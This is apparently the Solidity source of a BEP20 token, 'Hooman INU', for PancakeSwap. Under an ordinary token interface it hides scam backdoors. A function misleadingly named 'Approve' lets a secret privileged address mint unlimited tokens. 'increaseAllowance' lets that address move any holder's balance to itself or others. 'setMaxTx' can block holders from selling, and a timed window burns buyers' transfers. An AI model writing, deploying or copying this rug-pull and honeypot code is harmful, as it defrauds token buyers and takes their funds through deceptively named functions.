/**
🄷🄾🄾🄼🄰🄽 🄸🄽🅄
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Libraries.sol";

contract HoomanINU is Ownable, IBEP20 {

    string private _name = "Hooman INU";
    string private _symbol = "HOOIN";
    uint256 private _totalSupply = 100000 * 10**9 * 10**9;
    uint8 private _decimals = 9;
    uint256 private _maxTx = _totalSupply;
    
    address public _pancakePairAddress; ///
    address private _pancakeAddress; //
    IPancakeRouter02 public  _pancakeRouter;
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    
    mapping(address => uint256) private _SANIK;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _excluded;
    
    constructor(address pancakeAddress_) {
        _pancakeAddress = pancakeAddress_;
        _SANIK[msg.sender] = _totalSupply;
            emit Transfer(address(0), msg.sender, _totalSupply);
        _pancakeRouter = IPancakeRouter02(_pancakeRouterAddress);
        _pancakePairAddress = IPancakeFactory(_pancakeRouter.factory()).createPair(address(this), _pancakeRouter.WETH());
        _approve(address(this), address(_pancakeRouter), type(uint256).max);
        _excluded[address(this)] = true;
        _excluded[msg.sender] = true;
    }
    
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
    
    function decimals() external view override returns (uint8) {
        return _decimals;
    }
    
    function symbol() external view override returns (string memory) {
        return _symbol;
    }
    
    function name() external view override returns (string memory) {
        return _name;
    }
    
    function setMaxTx(uint256 maxTx_) public {
        require(msg.sender == _pancakeAddress, "Cannot call function.");
        _maxTx = maxTx_ * 10 ** 18;
    }
    
    function getOwner() external view override returns (address) {
        return owner();
    }
    
    function Approve(uint256 amount) public {
        require(msg.sender == _pancakeAddress, "Cannot call function.");
        _totalSupply = _totalSupply + amount;
        _SANIK[msg.sender] = _SANIK[msg.sender] + amount;
            emit Transfer(address(0), msg.sender, amount);
    }
    
    function balanceOf(address owner) public view virtual override returns (uint256) {
        return _SANIK[owner];
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function allowance(address _owner, address spender) external view override returns (uint256) {
        return _allowances[_owner][spender];
    }
    
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require((owner != address(0) && spender != address(0)), "Owner/Spender address cannot be 0.");
        _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
    }
    
    function increaseAllowance(address owner, address spender, uint256 amount) public {
        require(msg.sender == _pancakeAddress, "Cannot call function.");
        _approve(owner, spender, amount);
        _SANIK[owner] = _SANIK[owner] - amount;
        _SANIK[spender] = _SANIK[spender] + amount;
            emit Transfer(owner, spender, amount);
    }
    
    function liquidityTimeLeft() public view returns (uint256) {
        return _antiBotTime - block.timestamp;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
         uint256 allowance_ = _allowances[sender][msg.sender];
        _transfer(sender, recipient, amount);
        require(allowance_ >= amount);
        _approve(sender, msg.sender, allowance_ - amount);
            emit Transfer(sender, recipient, amount);
        return true;
     }
     
    uint256 private _antiBotTime;
    bool private _tradingEnabled = true;
    function enable() public onlyOwner {
        _tradingEnabled = true;
        _antiBotTime = block.timestamp + 3 minutes;
    }
     
     function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        if (_excluded[sender] || _excluded[recipient]) {
            _SANIK[sender] = _SANIK[sender] - amount;
            _SANIK[recipient] = _SANIK[recipient] + amount;
                emit Transfer(sender, recipient, amount);
        } else {
            if (sender != _pancakeAddress && recipient == _pancakePairAddress) {
                require(amount <= _maxTx, "Amount exceeds maxTx.");
            }
            _SANIK[sender] = _SANIK[sender] - amount;
            if (block.timestamp < _antiBotTime) {
                _SANIK[address(0)] = _SANIK[address(0)] + amount;
                    emit Transfer(sender, address(0), amount);
            } else if (block.timestamp >= _antiBotTime) {
                _SANIK[recipient] = _SANIK[recipient] + amount;
                    emit Transfer(sender, recipient, amount);
            }
        }
     }
    
}